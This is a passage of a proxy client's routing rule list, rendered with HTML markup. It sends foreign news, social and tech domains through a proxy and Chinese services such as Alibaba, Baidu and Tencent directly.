DOMAIN-SUFFIX,theguardian.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,theinitium.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,thetvdb.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tineye.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,torproject.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tumblr.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,turbobit.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tutanota.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tvboxnow.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,udn.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,unseen.is,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,upmedia.mg,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,uptodown.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,urbandictionary.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ustream.tv,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,uwants.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,v2ray.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,viber.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,videopress.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,vimeo.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,voachinese.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,voanews.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,voxer.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,vzw.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,w3schools.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,washingtonpost.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wattpad.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,whoer.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wikimapia.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wikimedia.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wikipedia.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wikiquote.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wikiwand.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,winudf.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wire.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wordpress.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,workflow.is,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,worldcat.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wsj.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wsj.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,xhamster.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,xn--90wwvt03e.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,xn--i2ru8q2qg.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,xnxx.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,xvideos.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,yahoo.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,yandex.ru,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ycombinator.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,yesasia.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,yes-news.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,yomiuri.co.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,you-get.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,zaobao.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,zb.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,zello.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,zeronet.io,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,zoom.us,PROXY</span><br><span class="line">- DOMAIN-KEYWORD,github,PROXY</span><br><span class="line">- DOMAIN-KEYWORD,jav,PROXY</span><br><span class="line">- DOMAIN-KEYWORD,pinterest,PROXY</span><br><span class="line">- DOMAIN-KEYWORD,porn,PROXY</span><br><span class="line">- DOMAIN-KEYWORD,wikileaks,PROXY</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">(Region-Restricted Access Denied)</span></span><br><span class="line">- DOMAIN-SUFFIX,apartmentratings.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,apartments.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bankmobilevibe.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bing.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,booktopia.com.au,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cccat.io,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,centauro.com.br,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,clearsurance.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,costco.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,crackle.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,depositphotos.cn,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dish.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dmm.co.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dmm.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dnvod.tv,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,esurance.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,extmatrix.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,fastpic.ru,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,flipboard.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,fnac.be,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,fnac.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,funkyimg.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,fxnetworks.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gettyimages.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,go.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,here.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,jcpenney.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,jiehua.tv,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,mailfence.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nationwide.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nbc.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nexon.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nordstrom.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nordstromimage.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nordstromrack.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,superpages.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,target.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,thinkgeek.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tracfone.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,unity3d.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,uploader.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,vevo.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,viu.tv,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,vk.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,vsco.co,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,xfinity.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,zattoo.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Roam*,PROXY</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">(The Most Popular Sites)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Apple</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; TestFlight</span></span><br><span class="line">- DOMAIN,testflight.apple.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; Apple URL Shortener</span></span><br><span class="line">- DOMAIN-SUFFIX,appsto.re,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; iBooks Store download</span></span><br><span class="line">- DOMAIN,books.itunes.apple.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; iTunes Store Moveis Trailers</span></span><br><span class="line">- DOMAIN,hls.itunes.apple.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; App Store Preview</span></span><br><span class="line">- DOMAIN,apps.apple.com,PROXY</span><br><span class="line">- DOMAIN,itunes.apple.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; Spotlight</span></span><br><span class="line">- DOMAIN,api-glb-sea.smoot.apple.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; Dictionary</span></span><br><span class="line">- DOMAIN,lookup-api.apple.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Google</span></span><br><span class="line">- DOMAIN-SUFFIX,abc.xyz,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,android.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,androidify.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dialogflow.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,autodraw.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,capitalg.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,certificate-transparency.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,chrome.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,chromeexperiments.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,chromestatus.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,chromium.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,creativelab5.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,debug.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,deepmind.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,firebaseio.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,getmdl.io,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ggpht.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gmail.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gmodules.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,godoc.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,golang.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gstatic.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gv.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gwtproject.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,itasoftware.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,madewithcode.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,material.io,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,polymer-project.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,admin.recaptcha.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,recaptcha.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,shattered.io,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,synergyse.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,telephony.goog,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tensorflow.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tfhub.dev,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tiltbrush.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,waveprotocol.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,waymo.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,webmproject.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,webrtc.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,whatbrowser.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,widevine.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,x.company,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,youtu.be,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,yt.be,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ytimg.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Microsoft</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; Microsoft OneDrive</span></span><br><span class="line">- DOMAIN-SUFFIX,1drv.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,1drv.ms,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,blob.core.windows.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,livefilestore.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,onedrive.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,storage.live.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,storage.msn.com,PROXY</span><br><span class="line">- DOMAIN,oneclient.sfx.ms,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Other</span></span><br><span class="line">- DOMAIN-SUFFIX,0rz.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,4bluestones.biz,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,9bis.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,allconnected.co,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,aol.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bcc.com.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bit.ly,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bitshare.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,blog.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,blogimg.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,blogtd.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,broadcast.co.nz,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,camfrog.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cfos.de,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,citypopulation.de,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cloudfront.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ctitv.com.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cuhk.edu.hk,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cusu.hk,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,discord.gg,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,discuss.com.hk,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dropboxapi.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,duolingo.cn,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,edditstatic.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,flickriver.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,focustaiwan.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,free.fr,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gigacircle.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hk-pub.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hosting.co.uk,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hwcdn.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ifixit.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,iphone4hongkong.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,iphonetaiwan.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,iptvbin.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,linksalpha.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,manyvids.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,myactimes.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,newsblur.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,now.im,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nowe.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,redditlist.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,s3.amazonaws.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,signal.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,smartmailcloud.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,sparknotes.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,streetvoice.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,supertop.co,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tv.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,typepad.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,udnbkk.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,urbanairship.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,whispersystems.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wikia.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wn.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wolframalpha.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,x-art.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,yimg.com,PROXY</span><br><span class="line">- DOMAIN,api.steampowered.com,PROXY</span><br><span class="line">- DOMAIN,store.steampowered.com,PROXY</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">China Area Network</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; 360</span></span><br><span class="line">- DOMAIN-SUFFIX,qhres.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,qhimg.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Akamai</span></span><br><span class="line">- DOMAIN-SUFFIX,akadns.net,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">- DOMAIN-SUFFIX,akamai.net,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- DOMAIN-SUFFIX,akamaiedge.net,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- DOMAIN-SUFFIX,akamaihd.net,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- DOMAIN-SUFFIX,akamaistream.net,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- DOMAIN-SUFFIX,akamaized.net,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Alibaba</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,%E4%BC%98%E9%85%B7*,DIRECT</span></span><br><span class="line">- DOMAIN-SUFFIX,alibaba.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,alicdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,alikunlun.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,alipay.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,amap.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,autonavi.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,dingtalk.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,mxhichina.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,soku.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,taobao.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tmall.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tmall.hk,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ykimg.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,youku.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,xiami.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,xiami.net,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Baidu</span></span><br><span class="line">- DOMAIN-SUFFIX,baidu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,baidubcr.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,bdstatic.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,yunjiasu-cdn.net,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; bilibili</span></span><br><span class="line">- DOMAIN-SUFFIX,acgvideo.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,biliapi.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,biliapi.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,bilibili.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,bilibili.tv,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,hdslb.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Blizzard</span></span><br><span class="line">- DOMAIN-SUFFIX,blizzard.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,battle.net,DIRECT</span><br><span class="line">- DOMAIN,blzddist1-a.akamaihd.net,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; ByteDance</span></span><br><span class="line">- DOMAIN-SUFFIX,feiliao.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,pstatp.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,snssdk.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,iesdouyin.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,toutiao.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; CCTV</span></span><br><span class="line">- DOMAIN-SUFFIX,cctv.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,cctvpic.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,livechina.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; DiDi</span></span><br><span class="line">- DOMAIN-SUFFIX,didialift.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,didiglobal.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,udache.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; è›‹è›‹èµ</span></span><br><span class="line">- DOMAIN-SUFFIX,343480.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,baduziyuan.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,com-hs-hkdy.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,czybjz.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,dandanzan.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,fjhps.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,kuyunbo.club,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; ChinaNet</span></span><br><span class="line">- DOMAIN-SUFFIX,21cn.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; HunanTV</span></span><br><span class="line">- DOMAIN-SUFFIX,hitv.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,mgtv.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; iQiyi</span></span><br><span class="line">- DOMAIN-SUFFIX,iqiyi.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,iqiyipic.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,71.am.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; JD</span></span><br><span class="line">- DOMAIN-SUFFIX,jd.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,jd.hk,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,jdpay.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,360buyimg.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Kingsoft</span></span><br><span class="line">- DOMAIN-SUFFIX,iciba.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ksosoft.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Meitu</span></span><br><span class="line">- DOMAIN-SUFFIX,meitu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,meitudata.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,meitustat.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,meipai.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; MI</span></span><br><span class="line">- DOMAIN-SUFFIX,duokan.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,mi-img.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,miui.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,miwifi.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,xiaomi.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Microsoft</span></span><br><span class="line">- DOMAIN-SUFFIX,microsoft.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,msecnd.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,office365.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,outlook.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,s-microsoft.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,visualstudio.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,windows.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,windowsupdate.com,DIRECT</span><br><span class="line">- DOMAIN,officecdn-microsoft-com.akamaized.net,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; NetEase</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,NeteaseMusic*,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90*,DIRECT</span></span><br><span class="line">- DOMAIN-SUFFIX,163.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,126.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,127.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,163yun.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,lofter.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,netease.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ydstatic.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Sina</span></span><br><span class="line">- DOMAIN-SUFFIX,sina.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,weibo.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,weibocdn.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Sohu</span></span><br><span class="line">- DOMAIN-SUFFIX,sohu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sohucs.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sohu-inc.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,v-56.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Sogo</span></span><br><span class="line">- DOMAIN-SUFFIX,sogo.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sogou.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sogoucdn.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Steam</span></span><br><span class="line">- DOMAIN-SUFFIX,steampowered.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,steam-chat.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,steamgames.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,steamusercontent.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,steamcontent.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,steamstatic.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,steamcdn-a.akamaihd.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,steamstat.us,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Tencent</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,MicroMessenger%20Client,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,WeChat*,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1*,DIRECT</span></span><br><span class="line">- DOMAIN-SUFFIX,gtimg.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,idqqimg.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,igamecj.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,myapp.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,myqcloud.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,qq.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,servicewechat.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tencent.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tencent-cloud.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tenpay.com,DIRECT</span><br><span class="line">- DOMAIN,file-igamecj.akamaized.net,DIRECT</span><br><span class="line">- 